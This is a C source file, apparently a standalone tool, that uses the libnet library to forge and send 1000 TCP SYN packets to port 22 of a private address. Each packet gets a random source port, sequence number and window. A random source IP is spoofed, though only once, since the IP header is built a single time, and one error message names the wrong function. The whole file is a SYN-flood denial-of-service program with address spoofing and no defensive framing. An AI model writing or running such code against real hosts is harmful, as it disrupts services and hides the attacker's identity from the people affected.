#include <stdio.h>
#include <libnet.h>

int main()
{
	int packet_size=0; //data package length
	libnet_t *l;       //libnet handle
	char *device=NULL; //device name
	char error_information[LIBNET_ERRBUF_SIZE];
	
	l = libnet_init(LIBNET_LINK,device,error_information);
	if (NULL == l)
	{
		fprintf(stderr, "libnet_init(): %s",error_information);
	}
	
	char *destination_ip_str = "192.168.0.53";
	char *source_ip_str = "192.168.0.53";
	u_int8_t dstmac[6] = {0x01,0x02,0x03,0x04,0x05,0x06};

	u_long  destination_ip;
	u_long  source_ip;
	
	int result;

	destination_ip = libnet_name2addr4(l,destination_ip_str,LIBNET_RESOLVE);
	//source_ip = libnet_name2addr4(l,source_ip_str,LIBNET_RESOLVE);
	
	libnet_seed_prand(l); //get random seed 
	
	libnet_ptag_t t;
	u_int16_t src_prt = 0;
	u_int16_t dst_prt = 22;

	u_int32_t seqr = 0;
	u_int32_t ackr = 0; 
	u_int16_t winr = 0;

  t = libnet_build_tcp_options(
        "\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",
        20,
        l,
        0);
  if (-1 == t)
  	{
  		fprintf(stderr,"libnet_build_ethernet error: %s",libnet_geterror(l));	
  	} 

	t = LIBNET_PTAG_INITIALIZER ; //tcp init
	int build_ip_flag = 1;
	int i=0;
	
	for (i=0; i<1000; ++i)
	{
		
		src_prt = libnet_get_prand(LIBNET_PRu16);
		seqr = libnet_get_prand(LIBNET_PRu32);
		ackr = libnet_get_prand(LIBNET_PRu32);
		winr = libnet_get_prand(LIBNET_PRu16);
		
		
		t = libnet_build_tcp(src_prt,
												 dst_prt,
												 seqr,
												 ackr,
												 TH_SYN,
												 winr,
												 0,
												 10,
												 LIBNET_TCP_H + 20, //tcp length = header + option + data 
												 NULL,
												 0,
												 l,
												 t);
												 
			if (build_ip_flag) //just build ip package only once
			{
				build_ip_flag = 0;
				libnet_build_ipv4(LIBNET_TCP_H + 20 + LIBNET_IPV4_H,
													0,
													libnet_get_prand(LIBNET_PRu16),
													0,
													64,//libnet_get_prand(LIBNET_PR8),
													IPPROTO_TCP, //protocol type: tcp/ip
													0, //check sum
													source_ip = libnet_get_prand(LIBNET_PRu32), //source ip random number
													destination_ip,
													NULL,
													0,
													l,
													0);
													
				libnet_ptag_t ethtag;									
				ethtag = libnet_build_ethernet((u_int8_t *)&dstmac,
															(u_int8_t *)&dstmac,
															ETHERTYPE_IP,
															NULL,
															0,
															l,
															0);			
															
				if (-1 == ethtag)
				{
					 fprintf(stderr,"libnet_build_ethernet error: %s",libnet_geterror(l));	
				}											
				
			}
			
			result = libnet_write(l);
			if (-1 == result)
			{
				fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
			}				
												 
	}	
	
	libnet_destroy(l);
	return 0;
}
